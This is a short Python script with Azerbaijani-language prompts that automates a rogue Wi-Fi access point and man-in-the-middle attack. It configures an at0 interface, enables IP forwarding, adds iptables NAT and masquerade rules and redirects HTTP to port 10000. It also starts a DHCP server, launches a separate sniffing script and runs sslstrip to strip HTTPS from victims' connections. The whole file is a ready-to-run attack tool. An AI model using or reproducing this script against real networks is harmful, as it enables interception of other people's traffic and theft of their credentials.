#!/usr/bin/python3

import os
import subprocess
import shlex


W  = '\033[0m'  # ağ
R  = '\033[31m' # qırmızı
G  = '\033[32m' # yaşıl


def sniff(snif):
    subprocess.call(shlex.split("gnome-terminal -x sh -c \'{0};bash\'".format(snif)))



print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '0%')
os.system('ifconfig at0 192.168.1.1 netmask 255.255.255.0')
print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '10%')
os.system('ifconfig at0 mtu 1400')
print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '20%')
os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '30%')
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '40%')
getawayip = input(G + 'Geteway ipsini yazın. (route -n comandı ilə görə bilərsən, eth.. nin qarşısında) :' + ' ')
os.system('iptables -t nat -A PREROUTING -p udp -j DNAT --to' + ' ' + getawayip)
print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '60%')
os.system('iptables -P FORWARD ACCEPT')
print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '70%')
os.system('iptables --append FORWARD --in-interface at0 -j ACCEPT')
print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '80%')
ifase = input(G + 'Iface adını yazın.Yalnız eth.. ilə başlayan. (route -n comandı ilə görə bilərsən) :' + ' ')
os.system('iptables --table nat --append POSTROUTING --out-interface' + ' ' + ifase + ' ' + '-j MASQUERADE')
os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '90%')

os.system('dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0')

os.system('/etc/init.d/isc-dhcp-server start')

print('[' + G + 'Servislər başladılır' + W + ']' + ' ' + '100%')

sniff("python3 sniff.py")

os.system('sslstrip -f -p -k 10000')



